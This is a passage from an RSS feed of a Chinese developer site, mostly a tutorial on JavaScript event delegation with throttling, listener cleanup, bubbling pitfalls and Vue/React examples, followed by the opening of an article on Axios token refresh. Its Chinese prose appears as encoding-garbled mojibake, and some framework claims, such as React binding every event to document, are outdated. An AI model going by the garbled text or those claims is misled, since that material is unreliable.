  <span class="hljs-keyword">switch</span>(e.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'click'</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç‚¹å‡»ï¼š'</span>, item.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'mouseenter'</span>:
      item.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">'#f5f5f5'</span>;
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'mouseleave'</span>:
      item.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">''</span>;
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<h3 data-id="heading-8">3. å§”æ‰˜åˆ° document/bodyï¼ˆå…¨å±€å§”æ‰˜ï¼‰</h3>
<p>å¯¹äºå…¨å±€èŒƒå›´å†…çš„åŠ¨æ€å…ƒç´ ï¼ˆå¦‚å¼¹çª—ã€åŠ¨æ€æŒ‰é’®ï¼‰ï¼Œå¯ä»¥å°†äº‹ä»¶å§”æ‰˜åˆ°<code>document</code>æˆ–<code>body</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å…¨å±€å§”æ‰˜ï¼šå¤„ç†æ‰€æœ‰åŠ¨æ€ç”Ÿæˆçš„æŒ‰é’®</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'dynamic-btn'</span>)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç‚¹å‡»äº†åŠ¨æ€æŒ‰é’®ï¼š'</span>, e.<span class="hljs-property">target</span>.<span class="hljs-property">textContent</span>);
  }
});

<span class="hljs-comment">// åŠ¨æ€åˆ›å»ºæŒ‰é’®</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'button'</span>);
  btn.<span class="hljs-property">className</span> = <span class="hljs-string">'dynamic-btn'</span>;
  btn.<span class="hljs-property">textContent</span> = <span class="hljs-string">'åŠ¨æ€æŒ‰é’®'</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(btn);
}, <span class="hljs-number">1000</span>);
</code></pre>
<p>âš ï¸ æ³¨æ„ï¼šå…¨å±€å§”æ‰˜è™½æ–¹ä¾¿ï¼Œä½†ä¸è¦æ»¥ç”¨ â€”â€”<code>document</code>ä¸Šçš„äº‹ä»¶ä¼šç›‘å¬æ•´ä¸ªé¡µé¢çš„ç‚¹å‡»ï¼Œè¿‡å¤šçš„å…¨å±€å§”æ‰˜ä¼šå¢åŠ äº‹ä»¶å¤„ç†çš„è€—æ—¶ï¼Œå»ºè®®ä¼˜å…ˆå§”æ‰˜åˆ°æœ€è¿‘çš„çˆ¶å…ƒç´ ã€‚</p>
<h2 data-id="heading-9">äº”ã€æ€§èƒ½ä¼˜åŒ–ï¼šè®©äº‹ä»¶å§”æ‰˜æ›´é«˜æ•ˆ</h2>
<p>äº‹ä»¶å§”æ‰˜æœ¬èº«æ˜¯é«˜æ€§èƒ½æ–¹æ¡ˆï¼Œä½†ä¸å½“ä½¿ç”¨ä»ä¼šäº§ç”Ÿæ€§èƒ½é—®é¢˜ï¼Œä»¥ä¸‹æ˜¯ä¼˜åŒ–æŠ€å·§ï¼š</p>
<h3 data-id="heading-10">1. é€‰æ‹©æœ€è¿‘çš„çˆ¶å…ƒç´ </h3>
<p>å°½é‡é¿å…ç›´æ¥å§”æ‰˜åˆ°<code>document</code>/<code>body</code>ï¼Œè€Œæ˜¯é€‰æ‹©ç¦»ç›®æ ‡å…ƒç´ æœ€è¿‘çš„å›ºå®šçˆ¶å…ƒç´ ã€‚æ¯”å¦‚åˆ—è¡¨çš„äº‹ä»¶å§”æ‰˜åˆ°<code>&lt;ul&gt;</code>ï¼Œè€Œé<code>document</code>ï¼Œå‡å°‘äº‹ä»¶ä¼ æ’­çš„å±‚çº§å’Œå¤„ç†å‡½æ•°çš„è§¦å‘æ¬¡æ•°ã€‚</p>
<h3 data-id="heading-11">2. èŠ‚æµ / é˜²æŠ–å¤„ç†é«˜é¢‘äº‹ä»¶</h3>
<p>å¦‚æœå§”æ‰˜çš„æ˜¯<code>scroll</code>ã€<code>resize</code>ã€<code>mousemove</code>ç­‰é«˜é¢‘äº‹ä»¶ï¼Œå¿…é¡»ç»“åˆèŠ‚æµ / é˜²æŠ–ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// èŠ‚æµå‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">fn, delay = <span class="hljs-number">100</span></span>) {
  <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!timer) {
      timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
        timer = <span class="hljs-literal">null</span>;
      }, delay);
    }
  };
}

<span class="hljs-comment">// å§”æ‰˜scrolläº‹ä»¶ï¼ˆèŠ‚æµå¤„ç†ï¼‰</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-title function_">throttle</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// å¤„ç†æ»šåŠ¨é€»è¾‘</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ»šåŠ¨äº†'</span>);
}, <span class="hljs-number">200</span>));
</code></pre>
<h3 data-id="heading-12">3. åŠæ—¶ç§»é™¤æ— ç”¨çš„å§”æ‰˜äº‹ä»¶</h3>
<p>å¦‚æœå§”æ‰˜çš„çˆ¶å…ƒç´ è¢«é”€æ¯ï¼ˆæ¯”å¦‚å¼¹çª—å…³é—­ï¼‰ï¼Œè¦åŠæ—¶ç§»é™¤äº‹ä»¶ç›‘å¬ï¼Œé¿å…å†…å­˜æ³„æ¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'modal'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleModalClick</span> = (<span class="hljs-params">e</span>) =&gt; {
  <span class="hljs-comment">// å¼¹çª—å†…çš„äº‹ä»¶é€»è¾‘</span>
};

<span class="hljs-comment">// ç»‘å®šäº‹ä»¶</span>
modal.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleModalClick);

<span class="hljs-comment">// å¼¹çª—å…³é—­æ—¶ç§»é™¤äº‹ä»¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">closeModal</span>(<span class="hljs-params"/>) {
  modal.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleModalClick);
  modal.<span class="hljs-title function_">remove</span>();
}
</code></pre>
<h2 data-id="heading-13">å…­ã€é¿å‘æŒ‡å—ï¼šäº‹ä»¶å§”æ‰˜çš„å¸¸è§é—®é¢˜</h2>
<h3 data-id="heading-14">1. äº‹ä»¶è¢«é˜»æ­¢å†’æ³¡</h3>
<p>å¦‚æœå­å…ƒç´ çš„äº‹ä»¶å¤„ç†å‡½æ•°ä¸­è°ƒç”¨äº†<code>e.stopPropagation()</code>ï¼Œä¼šå¯¼è‡´äº‹ä»¶æ— æ³•å†’æ³¡åˆ°çˆ¶å…ƒç´ ï¼Œå§”æ‰˜å¤±æ•ˆï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šå­å…ƒç´ é˜»æ­¢å†’æ³¡ï¼Œå§”æ‰˜å¤±æ•ˆ</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.list-item'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// é˜»æ­¢å†’æ³¡</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­å…ƒç´ ç‚¹å‡»'</span>);
});

<span class="hljs-comment">// çˆ¶å…ƒç´ çš„å§”æ‰˜äº‹ä»¶ä¸ä¼šè§¦å‘</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å§”æ‰˜äº‹ä»¶'</span>); <span class="hljs-comment">// ä¸ä¼šæ‰§è¡Œ</span>
});
</code></pre>
<p>âœ… è§£å†³æ–¹æ¡ˆï¼šé¿å…åœ¨å­å…ƒç´ ä¸­éšæ„é˜»æ­¢å†’æ³¡ï¼Œè‹¥å¿…é¡»é˜»æ­¢ï¼Œéœ€ç¡®ä¿ä¸å½±å“å§”æ‰˜é€»è¾‘ã€‚</p>
<h3 data-id="heading-15">2. ç›®æ ‡å…ƒç´ æ˜¯ä¸å¯å†’æ³¡çš„äº‹ä»¶</h3>
<p>éƒ¨åˆ†äº‹ä»¶ä¸æ”¯æŒå†’æ³¡ï¼ˆå¦‚<code>focus</code>ã€<code>blur</code>ã€<code>mouseenter</code>ã€<code>mouseleave</code>ï¼‰ï¼Œç›´æ¥å§”æ‰˜ä¼šå¤±æ•ˆï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šmouseenterä¸å†’æ³¡ï¼Œå§”æ‰˜å¤±æ•ˆ</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é¼ æ ‡è¿›å…¥åˆ—è¡¨é¡¹'</span>); <span class="hljs-comment">// ä¸ä¼šè§¦å‘</span>
});
</code></pre>
<p>âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨äº‹ä»¶æ•è·æ¨¡å¼ï¼ˆç¬¬ä¸‰ä¸ªå‚æ•°è®¾ä¸º<code>true</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ•è·æ¨¡å¼å¤„ç†ä¸å†’æ³¡çš„äº‹ä»¶</span>
list.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseenter'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'.list-item'</span>);
  <span class="hljs-keyword">if</span> (item) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é¼ æ ‡è¿›å…¥åˆ—è¡¨é¡¹'</span>);
  }
}, <span class="hljs-literal">true</span>); <span class="hljs-comment">// å¼€å¯æ•è·æ¨¡å¼</span>
</code></pre>
<h3 data-id="heading-16">3. åŠ¨æ€ä¿®æ”¹å…ƒç´ çš„ç±»å / å±æ€§</h3>
<p>å¦‚æœç›®æ ‡å…ƒç´ çš„ç±»åã€<code>dataset</code>ç­‰ç”¨äºåˆ¤æ–­çš„å±æ€§è¢«åŠ¨æ€ä¿®æ”¹ï¼Œå¯èƒ½å¯¼è‡´å§”æ‰˜é€»è¾‘å¤±æ•ˆï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// åŠ¨æ€ä¿®æ”¹ç±»ååï¼Œå§”æ‰˜æ— æ³•åŒ¹é…</span>
<span class="hljs-keyword">const</span> item = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.list-item'</span>);
item.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'list-item'</span>); <span class="hljs-comment">// ç§»é™¤ç±»å</span>
<span class="hljs-comment">// æ­¤æ—¶ç‚¹å‡»è¯¥å…ƒç´ ï¼Œå§”æ‰˜é€»è¾‘ä¸ä¼šè§¦å‘</span>
</code></pre>
<p>âœ… è§£å†³æ–¹æ¡ˆï¼šå°½é‡ä½¿ç”¨ç¨³å®šçš„æ ‡è¯†ï¼ˆå¦‚å›ºå®šçš„<code>data-*</code>å±æ€§ï¼‰ï¼Œè€Œéæ˜“å˜çš„ç±»åã€‚</p>
<h2 data-id="heading-17">ä¸ƒã€æ¡†æ¶ä¸­çš„äº‹ä»¶å§”æ‰˜ï¼ˆVue/Reactï¼‰</h2>
<p>ç°ä»£å‰ç«¯æ¡†æ¶è™½å°è£…äº†äº‹ä»¶å¤„ç†ï¼Œä½†åº•å±‚ä»åŸºäºäº‹ä»¶å§”æ‰˜ï¼Œä¸”æœ‰ä¸“å±çš„ä½¿ç”¨æ–¹å¼ï¼š</p>
<h3 data-id="heading-18">1. Vue3 ä¸­çš„äº‹ä»¶å§”æ‰˜</h3>
<p>Vue çš„<code>v-on</code>ï¼ˆ<code>@</code>ï¼‰æŒ‡ä»¤é»˜è®¤ä¼šåˆ©ç”¨äº‹ä»¶å§”æ‰˜ï¼ˆç»‘å®šåˆ°ç»„ä»¶æ ¹å…ƒç´ ï¼‰ï¼Œä¹Ÿå¯æ‰‹åŠ¨å®ç°ç²¾ç»†åŒ–å§”æ‰˜ï¼š</p>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleListClick"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in list"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span> <span class="hljs-attr">:data-id</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
      {{ item.name }}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete-btn"</span>&gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">const</span> list = <span class="hljs-title function_">ref</span>([{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'åˆ—è¡¨é¡¹1'</span> }, { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'åˆ—è¡¨é¡¹2'</span> }]);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleListClick</span> = (<span class="hljs-params">e</span>) =&gt; {
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'[data-id]'</span>);
  <span class="hljs-keyword">if</span> (item) {
    <span class="hljs-keyword">const</span> id = item.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>;
    <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'delete-btn'</span>)) {
      list.<span class="hljs-property">value</span> = list.<span class="hljs-property">value</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">id</span> !== <span class="hljs-title class_">Number</span>(id));
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç‚¹å‡»åˆ—è¡¨é¡¹<span class="hljs-subst">${id}</span>`</span>);
    }
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-19">2. React ä¸­çš„äº‹ä»¶å§”æ‰˜</h3>
<p>React çš„åˆæˆäº‹ä»¶ç³»ç»Ÿæœ¬èº«å°±æ˜¯åŸºäºäº‹ä»¶å§”æ‰˜ï¼ˆæ‰€æœ‰äº‹ä»¶ç»‘å®šåˆ°<code>document</code>ï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨å®ç°ï¼Œä½†å¯é€šè¿‡<code>e.target</code>åˆ¤æ–­ç›®æ ‡å…ƒç´ ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">List</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [list, setList] = <span class="hljs-title function_">useState</span>([{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'åˆ—è¡¨é¡¹1'</span> }]);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleListClick</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'[data-id]'</span>);
    <span class="hljs-keyword">if</span> (item) {
      <span class="hljs-keyword">const</span> id = item.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç‚¹å‡»åˆ—è¡¨é¡¹<span class="hljs-subst">${id}</span>`</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleListClick}</span>&gt;</span>
      {list.map(item =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{item.id}</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">{item.id}</span>&gt;</span>{item.name}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-20">å…«ã€æ€»ç»“</h2>
<p>äº‹ä»¶å§”æ‰˜æ˜¯å‰ç«¯å¼€å‘ä¸­ â€œå››ä¸¤æ‹¨åƒæ–¤â€ çš„æŠ€å·§ï¼Œæ ¸å¿ƒæ˜¯<strong>åˆ©ç”¨äº‹ä»¶å†’æ³¡ï¼Œå°†å¤šä¸ªå­å…ƒç´ çš„äº‹ä»¶ç»‘å®šåˆ°çˆ¶å…ƒç´ ï¼Œé€šè¿‡ç›®æ ‡å…ƒç´ åˆ¤æ–­æ‰§è¡Œé€»è¾‘</strong>ã€‚å®ƒçš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li>å‡å°‘äº‹ä»¶ç»‘å®šæ•°é‡ï¼Œé™ä½å†…å­˜å ç”¨ï¼›</li>
<li>å¤©ç„¶æ”¯æŒåŠ¨æ€å…ƒç´ ï¼Œæ— éœ€é‡å¤ç»‘å®šï¼›</li>
<li>ç®€åŒ–ä»£ç é€»è¾‘ï¼Œæå‡å¯ç»´æŠ¤æ€§ã€‚</li>
</ul>
<p>ä½¿ç”¨æ—¶éœ€æ³¨æ„ï¼š</p>
<ol>
<li>ä¼˜å…ˆå§”æ‰˜åˆ°æœ€è¿‘çš„çˆ¶å…ƒç´ ï¼Œé¿å…å…¨å±€å§”æ‰˜ï¼›</li>
<li>å¤„ç†åµŒå¥—å…ƒç´ ç”¨<code>closest</code>ï¼Œå¤„ç†ä¸å†’æ³¡äº‹ä»¶ç”¨æ•è·æ¨¡å¼ï¼›</li>
<li>é«˜é¢‘äº‹ä»¶ç»“åˆèŠ‚æµ / é˜²æŠ–ï¼ŒåŠæ—¶ç§»é™¤æ— ç”¨äº‹ä»¶ï¼›</li>
<li>é¿å…éšæ„é˜»æ­¢å†’æ³¡ï¼Œé˜²æ­¢å§”æ‰˜å¤±æ•ˆã€‚</li>
</ol>
<p>æŒæ¡äº‹ä»¶å§”æ‰˜ï¼Œä¸ä»…èƒ½å†™å‡ºæ›´é«˜æ•ˆçš„ä»£ç ï¼Œæ›´èƒ½æ·±å…¥ç†è§£ DOM äº‹ä»¶æµçš„æœ¬è´¨ â€”â€” è¿™ä¹Ÿæ˜¯ä» â€œåˆçº§å‰ç«¯â€ åˆ° â€œä¸­é«˜çº§å‰ç«¯â€ çš„å¿…ç»ä¹‹è·¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯ Token åˆ·æ–°æœºåˆ¶å®æˆ˜ï¼šåŸºäº Axios çš„ accessToken è‡ªåŠ¨ç»­æœŸæ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7590503651115991090</link>    <guid>https://juejin.cn/post/7590503651115991090</guid>    <pubDate>2026-01-02T07:00:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590503651115991090" data-draft-id="7590011643296694310" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯ Token åˆ·æ–°æœºåˆ¶å®æˆ˜ï¼šåŸºäº Axios çš„ accessToken è‡ªåŠ¨ç»­æœŸæ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T07:00:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AntoineGriezmann"/> <meta itemprop="url" content="https://juejin.cn/user/1313259659208356"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯ Token åˆ·æ–°æœºåˆ¶å®æˆ˜ï¼šåŸºäº Axios çš„ accessToken è‡ªåŠ¨ç»­æœŸæ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1313259659208356/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AntoineGriezmann
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:00:01.000Z" title="Fri Jan 02 2026 07:00:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯</h2>
